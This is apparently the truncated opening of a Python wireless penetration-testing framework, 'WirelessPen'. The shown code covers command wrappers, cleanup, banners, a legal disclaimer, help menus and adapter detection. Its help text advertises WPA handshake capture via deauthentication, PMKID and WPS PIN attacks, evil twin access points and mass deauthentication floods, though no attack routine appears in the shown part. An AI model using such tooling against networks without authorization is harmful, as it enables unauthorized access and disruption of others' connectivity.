#!/usr/bin/env python3
"""
WirelessPen - Professional Wireless Penetration Testing Framework v2.2.0

A comprehensive wireless security assessment tool for ethical hackers and
security professionals. This framework provides advanced capabilities for
authorized wireless network penetration testing and security auditing.

Features:
- WPA/WPA2/WPA3 handshake capture with smart deauthentication
- PMKID clientless attacks with hashcat integration
- WPS PIN bruteforce and Pixie Dust attacks
- Evil Twin/Rogue AP deployment
- Mass deauthentication attacks
- Universal wireless adapter support
- Advanced network reconnaissance
- Comprehensive diagnostics and troubleshooting

Author: Crypt0xDev
GitHub: https://github.com/Crypt0xDev/WirelessPen
License: MIT
Version: 2.2.0 (Professional Edition)

LEGAL NOTICE: This tool is for authorized security testing only.
Unauthorized network access is illegal and may result in prosecution.
"""

# Imports
import os
import sys
import subprocess
import argparse
import signal
import time
import platform
import re
import hashlib
from datetime import datetime
from typing import List, Optional, Tuple, Dict
from pathlib import Path

# Script Configuration
SCRIPT_NAME = "WirelessPen"
SCRIPT_VERSION = "2.2.0"
SCRIPT_BUILD = "Professional Edition"
SCRIPT_AUTHOR = "Crypt0xDev"
SCRIPT_GITHUB = "https://github.com/Crypt0xDev/WirelessPen"
SCRIPT_LICENSE = "MIT"
MIN_PYTHON_VERSION = "3.6"
BUILD_DATE = "2024-11-04"


# Enhanced ANSI Color Codes and Styling
class Colors:
    # Basic Colors
    RED = "\033[0;31m\033[1m"
    GREEN = "\033[0;32m\033[1m"
    YELLOW = "\033[0;33m\033[1m"
    BLUE = "\033[0;34m\033[1m"
    PURPLE = "\033[0;35m\033[1m"
    CYAN = "\033[0;36m\033[1m"
    WHITE = "\033[0;37m\033[1m"
    GRAY = "\033[0;90m\033[1m"

    # Extended Colors
    ORANGE = "\033[38;5;208m\033[1m"
    PINK = "\033[38;5;199m\033[1m"
    LIME = "\033[38;5;118m\033[1m"
    VIOLET = "\033[38;5;141m\033[1m"

    # Text Styles
    BOLD = "\033[1m"
    DIM = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    REVERSE = "\033[7m"
    STRIKETHROUGH = "\033[9m"

    # Background Colors
    BG_RED = "\033[41m"
    BG_GREEN = "\033[42m"
    BG_YELLOW = "\033[43m"
    BG_BLUE = "\033[44m"
    BG_PURPLE = "\033[45m"
    BG_CYAN = "\033[46m"
    BG_WHITE = "\033[47m"

    # Reset
    RESET = "\033[0m"

    # Special Symbols
    SUCCESS = f"{GREEN}✓{RESET}"
    FAILURE = f"{RED}✗{RESET}"
    WARNING = f"{YELLOW}⚠{RESET}"
    INFO = f"{CYAN}ℹ{RESET}"
    ARROW = f"{BLUE}→{RESET}"
    BULLET = f"{PURPLE}•{RESET}"


# Enhanced Global State Management
class GlobalState:
    def __init__(self):
        self.network_card: Optional[str] = None
        self.monitor_interface: Optional[str] = None
        self.attack_mode: Optional[str] = None
        self.wireless_cards: List[str] = []
        self.script_start_time: float = time.time()
        self.target_network: Optional[Dict[str, str]] = None
        self.output_directory: str = str(Path.home() / "WirelessPen_Results")
        self.session_id: str = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        self.verbose_mode: bool = False
        self.auto_mode: bool = False
        self.processes: List[subprocess.Popen] = []
        self.temp_files: List[str] = []

    def add_temp_file(self, filepath: str):
        """Add temporary file for cleanup"""
        self.temp_files.append(filepath)

    def add_process(self, process: subprocess.Popen):
        """Add process for cleanup"""
        self.processes.append(process)

    def cleanup(self):
        """Clean up temporary files and processes"""
        # Terminate processes
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except (subprocess.TimeoutExpired, ProcessLookupError):
                try:
                    proc.kill()
                except ProcessLookupError:
                    pass

        # Remove temporary files
        for temp_file in self.temp_files:
            try:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
            except OSError:
                pass

        self.processes.clear()
        self.temp_files.clear()


state = GlobalState()

# Configuration Constants
CONFIG = {
    "DEFAULT_SCAN_TIME": 30,
    "DEAUTH_COUNT": 20,
    "HANDSHAKE_TIMEOUT": 300,
    "WPS_TIMEOUT": 600,
    "PMKID_TIMEOUT": 120,
    "MAX_RETRIES": 3,
    "WORDLIST_PATHS": [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/wpa2.txt",
        "/opt/wordlists/rockyou.txt",
        "~/wordlists/rockyou.txt",
    ],
}

# ═══════════════════════════════════════════════════════════════════════════════
#                              UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════


def run_command(
    cmd: str, shell: bool = True, capture: bool = True, timeout: int = 30
) -> Tuple[int, str, str]:
    """
    Execute a shell command with enhanced error handling and timeout.

    Args:
        cmd: Command to execute
        shell: Whether to use shell
        capture: Whether to capture output
        timeout: Command timeout in seconds

    Returns:
        Tuple of (exit_code, stdout, stderr)
    """
    try:
        if state.verbose_mode:
            print(f"{Colors.GRAY}[DEBUG] Executing: {cmd}{Colors.RESET}")

        if capture:
            result = subprocess.run(
                cmd,
                shell=shell,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout,
            )
            return result.returncode, result.stdout, result.stderr
        else:
            result = subprocess.run(cmd, shell=shell, timeout=timeout)
            return result.returncode, "", ""

    except subprocess.TimeoutExpired:
        return 124, "", f"Command timed out after {timeout} seconds"
    except FileNotFoundError:
        return 127, "", f"Command not found: {cmd.split()[0] if cmd else 'unknown'}"
    except PermissionError:
        return 126, "", "Permission denied"
    except Exception as e:
        return 1, "", str(e)


def run_command_async(cmd: str, shell: bool = True) -> subprocess.Popen:
    """
    Execute a command asynchronously and return the process.

    Args:
        cmd: Command to execute
        shell: Whether to use shell

    Returns:
        Popen process object
    """
    try:
        if state.verbose_mode:
            print(f"{Colors.GRAY}[DEBUG] Starting async: {cmd}{Colors.RESET}")

        proc = subprocess.Popen(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            preexec_fn=os.setsid,  # Create new process group
        )
        state.add_process(proc)
        return proc
    except Exception as e:
        print(f"{Colors.RED}[!]{Colors.RESET} Error starting process: {e}")
        raise


def kill_process_group(proc: subprocess.Popen) -> bool:
    """
    Kill a process and its entire process group.

    Args:
        proc: Process to kill

    Returns:
        True if successful, False otherwise
    """
    try:
        # Kill the entire process group
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        # Wait for termination
        proc.wait(timeout=5)
        return True
    except (subprocess.TimeoutExpired, ProcessLookupError, OSError):
        try:
            # Force kill if graceful termination failed
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            proc.wait(timeout=2)
            return True
        except (subprocess.TimeoutExpired, ProcessLookupError, OSError):
            return False


def check_root():
    """Check if script is running with root privileges."""
    if os.geteuid() != 0:
        print(f"{Colors.RED}[!]{Colors.RESET} This script requires root privileges")
        print(
            f"{Colors.YELLOW}[*]{Colors.RESET} Please run: {Colors.CYAN}sudo python3 {sys.argv[0]}{Colors.RESET}"
        )
        sys.exit(1)


def check_python_version():
    """Check if Python version is compatible."""
    current_version = f"{sys.version_info.major}.{sys.version_info.minor}"
    required = tuple(map(int, MIN_PYTHON_VERSION.split(".")))
    current = (sys.version_info.major, sys.version_info.minor)

    if current < required:
        print(
            f"{Colors.RED}[!]{Colors.RESET} Python {MIN_PYTHON_VERSION}+ required. Current: {current_version}"
        )
        sys.exit(1)


def clear_screen():
    """Clear the terminal screen."""
    os.system("clear" if os.name == "posix" else "cls")


def signal_handler(sig, frame):
    """Handle Ctrl+C interrupt."""
    elapsed = int(time.time() - state.script_start_time)
    elapsed_formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))

    print(
        f"\n\n{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.YELLOW}║{Colors.WHITE}                           INTERRUPTION DETECTED                              {Colors.YELLOW}║{Colors.RESET}"
    )
    print(
        f"{Colors.YELLOW}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}"
    )
    print(f"{Colors.CYAN}[i]{Colors.RESET} Session interrupted by user (Ctrl+C)")
    print(f"{Colors.CYAN}[i]{Colors.RESET} Session duration: {elapsed_formatted}")
    print(f"{Colors.YELLOW}[*]{Colors.RESET} Performing cleanup operations...")

    cleanup_exit()


def cleanup_exit(exit_code: int = 0):
    """
    Comprehensive cleanup and graceful exit.

    Args:
        exit_code: Exit status code
    """
    elapsed = int(time.time() - state.script_start_time)
    elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))

    print(f"\n{Colors.CYAN}🧹 CLEANUP OPERATIONS:{Colors.RESET}")

    # Stop all background processes
    if state.processes:
        print(
            f"  {Colors.ARROW} Terminating {len(state.processes)} background process(es)..."
        )
        for proc in state.processes[
            :
        ]:  # Copy list to avoid modification during iteration
            try:
                if proc.poll() is None:  # Process still running
                    kill_process_group(proc)
            except Exception as e:
                if state.verbose_mode:
                    print(
                        f"    {Colors.GRAY}[DEBUG] Error killing process: {e}{Colors.RESET}"
                    )
        state.processes.clear()

    # Restore network interface
    if state.monitor_interface and state.network_card:
        print(f"  {Colors.ARROW} Restoring interface {state.monitor_interface}...")

        # Try multiple methods to restore
        methods = [
            f"iw {state.monitor_interface} set type managed",
            f"iwconfig {state.monitor_interface} mode managed",
            f"airmon-ng stop {state.monitor_interface}",
            f"airmon-ng stop {state.network_card}",
        ]

        for method in methods:
            code, _, _ = run_command(method, timeout=5)
            if code == 0:
                break

        # Bring interface up
        run_command(f"ip link set {state.network_card} up", timeout=5)

    # Clean temporary files
    if state.temp_files:
        print(f"  {Colors.ARROW} Removing {len(state.temp_files)} temporary file(s)...")
        for temp_file in state.temp_files:
            try:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
            except OSError as e:
                if state.verbose_mode:
                    print(
                        f"    {Colors.GRAY}[DEBUG] Error removing {temp_file}: {e}{Colors.RESET}"
                    )

    # Remove common temporary files from current directory
    temp_patterns = [
        "Captura*",
        "myHashes*",
        "replay_*",
        ".cap",
        ".csv",
        "handshake_*",
        "pmkid_*",
        "wps_*",
        "scan_*",
    ]

    for pattern in temp_patterns:
        run_command(f"rm -f {pattern} 2>/dev/null", timeout=5)

    # Restart network services (if they were stopped)
    print(f"  {Colors.ARROW} Restoring network services...")
    run_command(
        "systemctl start NetworkManager 2>/dev/null || service NetworkManager start 2>/dev/null",
        timeout=10,
    )
    run_command(
        "systemctl start wpa_supplicant 2>/dev/null || service wpa_supplicant start 2>/dev/null",
        timeout=10,
    )

    # Show session summary
    print(f"\n{Colors.CYAN}📋 SESSION SUMMARY:{Colors.RESET}")
    print(f"  Session ID:     {state.session_id}")
    print(f"  Duration:       {elapsed_str}")
    print(f"  Interface:      {state.network_card or 'None'}")
    print(f"  Attack Mode:    {state.attack_mode or 'None'}")
    print(f"  Results Dir:    {state.output_directory}")

    if state.target_network:
        print(
            f"  Target:         {state.target_network.get('essid', 'Unknown')} ({state.target_network.get('bssid', 'Unknown')})"
        )

    # Exit status message
    if exit_code == 0:
        print(
            f"\n{Colors.SUCCESS} {Colors.GREEN}Session completed successfully{Colors.RESET}"
        )
    elif exit_code == 130:  # SIGINT
        print(
            f"\n{Colors.WARNING} {Colors.YELLOW}Session interrupted by user{Colors.RESET}"
        )
    else:
        print(
            f"\n{Colors.FAILURE} {Colors.RED}Session ended with errors (code: {exit_code}){Colors.RESET}"
        )

    # Final cleanup of global state
    try:
        state.cleanup()
    except Exception:
        pass

    sys.exit(exit_code)


# ═══════════════════════════════════════════════════════════════════════════════
#                              DISPLAY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════


def show_banner():
    """Display enhanced professional banner."""
    clear_screen()

    # Enhanced ASCII Logo
    print(
        f"{Colors.CYAN}╔══════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.BLUE}  ██     ██ ██ ██████  ███████ ██      ███████ ███████ ███████  {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.BLUE}  ██     ██ ██ ██   ██ ██      ██      ██      ██      ██       {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.BLUE}  ██  █  ██ ██ ██████  █████   ██      █████   ███████ ███████  {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.BLUE}  ██ ███ ██ ██ ██   ██ ██      ██      ██           ██      ██  {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.BLUE}   ███ ███  ██ ██   ██ ███████ ███████ ███████ ███████ ███████  {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                                                                  {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.YELLOW}              📡 Wireless Penetration Framework v{SCRIPT_VERSION}             {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.PURPLE}                    {SCRIPT_BUILD}                     {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.GRAY}                        by {SCRIPT_AUTHOR}                           {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}"
    )

    # Session information
    session_info = f"Session: {state.session_id} | Build: {BUILD_DATE}"
    print(f"{Colors.GRAY}  {session_info:<66}{Colors.RESET}\n")


def show_quick_help():
    """Show quick usage like nmap."""
    print(f"{Colors.YELLOW}USAGE:{Colors.RESET}")
    print(
        f"  {Colors.WHITE}wirelesspen{Colors.RESET} {Colors.CYAN}<attack>{Colors.RESET} [{Colors.GREEN}options{Colors.RESET}]"
    )
    print(f"\n{Colors.YELLOW}ATTACKS:{Colors.RESET}")
    print(f"  {Colors.GREEN}handshake{Colors.RESET}     Capture WPA2 handshake")
    print(f"  {Colors.GREEN}pmkid{Colors.RESET}         PMKID clientless attack")
    print(f"  {Colors.GREEN}wps{Colors.RESET}           WPS PIN attack")
    print(f"  {Colors.GREEN}pixie{Colors.RESET}         WPS Pixie Dust")
    print(f"  {Colors.RED}deauth{Colors.RESET}        Deauth attack (DoS)")
    print(f"\n{Colors.YELLOW}OPTIONS:{Colors.RESET}")
    print(f"  {Colors.CYAN}-i{Colors.RESET} <interface>   WiFi interface")
    print(f"  {Colors.CYAN}-t{Colors.RESET} <target>      Target BSSID")
    print(f"  {Colors.CYAN}--scan{Colors.RESET}         Scan networks")
    print(f"  {Colors.CYAN}--help{Colors.RESET}         Show full help")
    print(f"\n{Colors.YELLOW}EXAMPLES:{Colors.RESET}")
    print(
        f"  {Colors.WHITE}wirelesspen{Colors.RESET} {Colors.GREEN}handshake{Colors.RESET} {Colors.CYAN}-i{Colors.RESET} wlan0"
    )
    print(
        f"  {Colors.WHITE}wirelesspen{Colors.RESET} {Colors.GREEN}pmkid{Colors.RESET} {Colors.CYAN}--scan{Colors.RESET}"
    )
    print(
        f"  {Colors.WHITE}wirelesspen{Colors.RESET} {Colors.GREEN}wps{Colors.RESET} {Colors.CYAN}-t{Colors.RESET} AA:BB:CC:DD:EE:FF"
    )
    print()


def show_disclaimer() -> bool:
    """Display legal disclaimer and get user agreement."""
    print(
        f"{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.RED}║{Colors.YELLOW}                                  DISCLAIMER                                   {Colors.RED}║{Colors.RESET}"
    )
    print(
        f"{Colors.RED}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}"
    )
    print(f"{Colors.YELLOW}⚠️  LEGAL NOTICE:{Colors.RESET}")
    print(
        "   This tool is intended for educational purposes and authorized security testing only."
    )
    print(
        "   Unauthorized access to networks is illegal and may result in criminal prosecution."
    )
    print()
    print(f"{Colors.YELLOW}📋 REQUIREMENTS:{Colors.RESET}")
    print("   • Written permission from network owner")
    print("   • Compliance with local and international laws")
    print("   • Responsible disclosure of vulnerabilities")
    print()
    print(
        f"{Colors.RED}🔒 By using this tool, you agree to use it responsibly and legally.{Colors.RESET}"
    )
    print()

    response = input(
        f"{Colors.YELLOW}[?]{Colors.RESET} Do you agree to these terms and conditions? [{Colors.GREEN}Y{Colors.RESET}/{Colors.RED}n{Colors.RESET}]: "
    ).strip()

    if response.lower() == "n":
        print(f"{Colors.RED}[!]{Colors.RESET} Terms not accepted. Exiting...")
        return False

    print(f"{Colors.GREEN}[✓]{Colors.RESET} Terms accepted. Proceeding...\n")
    return True


def show_version():
    """Display version and dependency information."""
    show_banner()

    print(
        f"{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                             VERSION INFORMATION                             {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )

    # Version Details
    print(f"{Colors.YELLOW}Script Name:{Colors.RESET:<20} {SCRIPT_NAME}")
    print(f"{Colors.YELLOW}Version:{Colors.RESET:<20} {SCRIPT_VERSION}")
    print(f"{Colors.YELLOW}Author:{Colors.RESET:<20} {SCRIPT_AUTHOR}")
    print(f"{Colors.YELLOW}GitHub:{Colors.RESET:<20} {SCRIPT_GITHUB}")
    print(f"{Colors.YELLOW}License:{Colors.RESET:<20} {SCRIPT_LICENSE}")
    print(f"{Colors.YELLOW}Python Version:{Colors.RESET:<20} {sys.version.split()[0]}")
    print(
        f"{Colors.YELLOW}Build Date:{Colors.RESET:<20} {datetime.now().strftime('%Y-%m-%d')}"
    )
    print()

    # Dependencies Status
    print(f"{Colors.YELLOW}📦 DEPENDENCIES STATUS:{Colors.RESET}")
    deps = [
        "aircrack-ng",
        "macchanger",
        "iwconfig",
        "hcxdumptool",
        "hashcat",
        "ethtool",
    ]

    for dep in deps:
        code, stdout, _ = run_command(f"which {dep}")
        if code == 0:
            code, version_out, _ = run_command(f"{dep} --version 2>/dev/null | head -1")
            version_match = re.search(r"\d+\.\d+(\.\d+)?", version_out)
            version = version_match.group() if version_match else "detected"
            print(f" {Colors.GREEN}✓{Colors.RESET} {dep:<15} {version}")
        else:
            print(f" {Colors.RED}✗{Colors.RESET} {dep:<15} Not installed")
    print()

    # System Information
    print(f"{Colors.YELLOW}🖥️  SYSTEM ENVIRONMENT:{Colors.RESET}")
    print(
        f" {'OS:':<15} {subprocess.getoutput('lsb_release -d 2>/dev/null | cut -f2') or platform.system()}"
    )
    print(f" {'Kernel:':<15} {platform.release()}")
    print(f" {'Architecture:':<15} {platform.machine()}")
    print(f" {'Shell:':<15} {os.environ.get('SHELL', 'unknown')}")
    print(f" {'Terminal:':<15} {os.environ.get('TERM', 'unknown')}")
    print()

    # Changelog Preview
    print(f"{Colors.YELLOW}📝 RECENT CHANGES:{Colors.RESET}")
    print(
        f" {Colors.GREEN}v2.2.0{Colors.RESET} - Rebranded to WirelessPen + Universal wireless support"
    )
    print(f" {Colors.GREEN}v2.0.5{Colors.RESET} - Added PKMID attack infrastructure")
    print(
        f" {Colors.GREEN}v2.0.0{Colors.RESET} - Complete Python rewrite with advanced features"
    )
    print()

    sys.exit(0)


def show_help():
    """Display help panel with usage information."""
    show_banner()

    print(
        f"{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                                 HELP & USAGE                                 {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )

    # Usage Synopsis
    print(f"{Colors.YELLOW}📖 SYNOPSIS:{Colors.RESET}")
    print(
        f"   {Colors.BOLD}{sys.argv[0]}{Colors.RESET} {Colors.CYAN}[OPTIONS]{Colors.RESET}"
    )
    print()

    # Command Line Options
    print(f"{Colors.YELLOW}⚙️  COMMAND LINE OPTIONS:{Colors.RESET}")
    print(
        f"{Colors.CYAN}╭─────────────────────────────────────────────────────────────────────────────────╮{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}│{Colors.RESET} {'FLAG':<4} {'PARAMETER':<20} {'DESCRIPTION':<51} {Colors.CYAN}│{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}├─────────────────────────────────────────────────────────────────────────────────┤{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}│{Colors.RESET} {'-a':<4} {'<attack_mode>':<20} {'Attack type: Handshake or PKMID':<51} {Colors.CYAN}│{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}│{Colors.RESET} {'-n':<4} {'<interface>':<20} {'Network interface (optional, auto-detected)':<51} {Colors.CYAN}│{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}│{Colors.RESET} {'-l':<4} {'':<20} {'List available network interfaces':<51} {Colors.CYAN}│{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}│{Colors.RESET} {'-t':<4} {'':<20} {'WiFi diagnostics and repair toolkit':<51} {Colors.CYAN}│{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}│{Colors.RESET} {'-v':<4} {'':<20} {'Display version information':<51} {Colors.CYAN}│{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}│{Colors.RESET} {'-h':<4} {'':<20} {'Show this help panel':<51} {Colors.CYAN}│{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╰─────────────────────────────────────────────────────────────────────────────────╯{Colors.RESET}\n"
    )

    # Attack Modes
    print(f"{Colors.YELLOW}🎯 ATTACK MODES:{Colors.RESET}")
    print(
        f"{Colors.GREEN}╭─────────────────────────────────────────────────────────────────────────────────╮{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}│{Colors.RESET} {'MODE':<15} {'DESCRIPTION':<62} {Colors.GREEN}│{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}├─────────────────────────────────────────────────────────────────────────────────┤{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}│{Colors.RESET} {'handshake':<15} {'Capture WPA/WPA2 4-way handshake via deauthentication':<62} {Colors.GREEN}│{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}│{Colors.RESET} {'pmkid_hashcat':<15} {'PMKID clientless attack optimized for Hashcat':<62} {Colors.GREEN}│{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}│{Colors.RESET} {'wps':<15} {'WPS PIN brute force attack':<62} {Colors.GREEN}│{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}│{Colors.RESET} {'pixie':<15} {'Pixie Dust WPS vulnerability (CVE-2014-4910)':<62} {Colors.GREEN}│{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}│{Colors.RESET} {'evil_twin':<15} {'Rogue access point attack (authorization required)':<62} {Colors.GREEN}│{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}│{Colors.RESET} {'deauth':<15} {'Mass deauthentication flood attack':<62} {Colors.GREEN}│{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}╰─────────────────────────────────────────────────────────────────────────────────╯{Colors.RESET}\n"
    )

    # Examples
    print(f"{Colors.YELLOW}💡 USAGE EXAMPLES:{Colors.RESET}")
    print(f"{Colors.PURPLE}   WPA2 Handshake Attack:{Colors.RESET}")
    print(f"   {Colors.CYAN}{sys.argv[0]} -a handshake{Colors.RESET}")
    print(
        f"   {Colors.GRAY}   → Captures 4-way handshake from WPA2 networks{Colors.RESET}"
    )
    print()
    print(f"{Colors.PURPLE}   PMKID Hashcat Attack:{Colors.RESET}")
    print(f"   {Colors.CYAN}{sys.argv[0]} -a pmkid_hashcat{Colors.RESET}")
    print(
        f"   {Colors.GRAY}   → Clientless attack, outputs hashcat-compatible hash{Colors.RESET}"
    )
    print()
    print(f"{Colors.PURPLE}   WPS PIN Attack:{Colors.RESET}")
    print(f"   {Colors.CYAN}{sys.argv[0]} -a wps -n wlan0{Colors.RESET}")
    print(
        f"   {Colors.GRAY}   → Brute force WPS PIN on specified interface{Colors.RESET}"
    )
    print()
    print(f"{Colors.PURPLE}   Pixie Dust Attack:{Colors.RESET}")
    print(f"   {Colors.CYAN}{sys.argv[0]} -a pixie{Colors.RESET}")
    print(
        f"   {Colors.GRAY}   → Exploits WPS vulnerability (CVE-2014-4910){Colors.RESET}"
    )
    print()
    print(f"{Colors.PURPLE}   Interactive Mode (Recommended):{Colors.RESET}")
    print(f"   {Colors.CYAN}{sys.argv[0]}{Colors.RESET}")
    print(
        f"   {Colors.GRAY}   → Shows menu with all available attack modes{Colors.RESET}"
    )
    print()

    # Requirements
    print(f"{Colors.YELLOW}📋 REQUIREMENTS:{Colors.RESET}")
    print(f" {Colors.GREEN}✓{Colors.RESET} Root privileges (sudo)")
    print(
        f" {Colors.GREEN}✓{Colors.RESET} Compatible WiFi adapter with monitor mode support"
    )
    print(f" {Colors.GREEN}✓{Colors.RESET} aircrack-ng suite")
    print(f" {Colors.GREEN}✓{Colors.RESET} macchanger (for MAC address spoofing)")
    print(f" {Colors.YELLOW}○{Colors.RESET} hcxtools (optional, for PKMID attacks)")
    print(f" {Colors.YELLOW}○{Colors.RESET} hashcat (optional, for PKMID cracking)")
    print()

    # Supported Hardware
    print(f"{Colors.YELLOW}🔧 SUPPORTED HARDWARE:{Colors.RESET}")
    print(
        f" {Colors.GREEN}✓{Colors.RESET} TP-Link AC/N series (T2U, T3U, T4U, TL-WN725N)"
    )
    print(
        f" {Colors.GREEN}✓{Colors.RESET} Realtek RTL8812AU/RTL8821AU/RTL8188EU series"
    )
    print(f" {Colors.GREEN}✓{Colors.RESET} MediaTek MT76xx/MT79xx series")
    print(f" {Colors.GREEN}✓{Colors.RESET} Atheros AR9271/ATH9K/ATH10K series")
    print()

    # Footer
    print(
        f"{Colors.GRAY}{Colors.DIM}For bug reports and feature requests, visit: {SCRIPT_GITHUB}{Colors.RESET}"
    )
    print(
        f"{Colors.GRAY}{Colors.DIM}Licensed under {SCRIPT_LICENSE} License. Use responsibly and legally.{Colors.RESET}\n"
    )

    sys.exit(0)


# ═══════════════════════════════════════════════════════════════════════════════
#                           NETWORK CARD FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════


def detect_wireless_cards() -> List[str]:
    """Detect all available wireless network cards."""
    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                📡 WIRELESSPEN - WIRELESS CARD DETECTION                  {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )

    print(
        f"{Colors.YELLOW}🔍 Scanning for wireless network interfaces...{Colors.RESET}"
    )

    # Detect wireless cards
    code, output, _ = run_command(
        "iwconfig 2>/dev/null | grep -oP '^[a-zA-Z0-9]+(?=\\s+IEEE 802.11)'"
    )
    wireless_cards = output.strip().split("\n") if output.strip() else []

    if not wireless_cards:
        print(f" {Colors.RED}✗{Colors.RESET} No wireless interfaces detected\n")

        # Try to find USB WiFi devices
        print(f"{Colors.YELLOW}🔌 Checking USB wireless devices...{Colors.RESET}")
        vendors = "tp-link|realtek|ralink|mediatek|atheros|broadcom|intel"
        code, usb_devices, _ = run_command(f"lsusb | grep -iE '{vendors}'")

        if usb_devices.strip():
            print(f" {Colors.GREEN}✓{Colors.RESET} Wireless USB devices found:")
            for device in usb_devices.strip().split("\n"):
                print(f"   {Colors.BLUE}→{Colors.RESET} {device}")
            print()
        else:
            print(f" {Colors.RED}✗{Colors.RESET} No wireless USB devices detected\n")

        # Show all network interfaces
        print(f"{Colors.YELLOW}🌐 Available network interfaces:{Colors.RESET}")
        code, interfaces, _ = run_command(
            "ip link show | grep -E '^[0-9]+:' | awk -F': ' '{print $2}' | grep -v lo | tr -d '@'"
        )

        if interfaces.strip():
            for iface in interfaces.strip().split("\n"):
                code, driver, _ = run_command(
                    f"ethtool -i {iface} 2>/dev/null | grep 'driver:' | awk '{{print $2}}'"
                )
                driver = driver.strip() or "unknown"
                code, status, _ = run_command(
                    f"ip link show {iface} | grep -o 'state [A-Z]*' | awk '{{print $2}}'"
                )
                status = status.strip() or "UNKNOWN"
                print(
                    f"   {Colors.PURPLE}•{Colors.RESET} {Colors.BLUE}{iface}{Colors.RESET} {Colors.GRAY}(Driver: {driver}, Status: {status}){Colors.RESET}"
                )
            print()

        # Troubleshooting guide
        print(
            f"{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
        )
        print(
            f"{Colors.RED}║{Colors.YELLOW}                            TROUBLESHOOTING GUIDE                            {Colors.RED}║{Colors.RESET}"
        )
        print(
            f"{Colors.RED}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}"
        )
        print(f"{Colors.YELLOW}🔧 Possible causes and solutions:{Colors.RESET}")
        print(
            f" {Colors.PURPLE}1){Colors.RESET} Wireless card not recognized as 802.11 device"
        )
        print(
            f"    {Colors.GRAY}→ Try: {Colors.CYAN}sudo iwconfig{Colors.RESET} to check manual detection"
        )
        print(f" {Colors.PURPLE}2){Colors.RESET} Driver incompatible or not installed")
        print(
            f"    {Colors.GRAY}→ Use: {Colors.CYAN}{sys.argv[0]} -t{Colors.RESET} for WiFi diagnostics"
        )
        print(f" {Colors.PURPLE}3){Colors.RESET} Card in incompatible mode or disabled")
        print(
            f"    {Colors.GRAY}→ Try: {Colors.CYAN}sudo rfkill unblock wifi{Colors.RESET}"
        )
        print(
            f" {Colors.PURPLE}4){Colors.RESET} USB device needs replug or power cycle"
        )
        print(f"    {Colors.GRAY}→ Disconnect and reconnect the USB adapter")
        print()

        sys.exit(1)

    print(
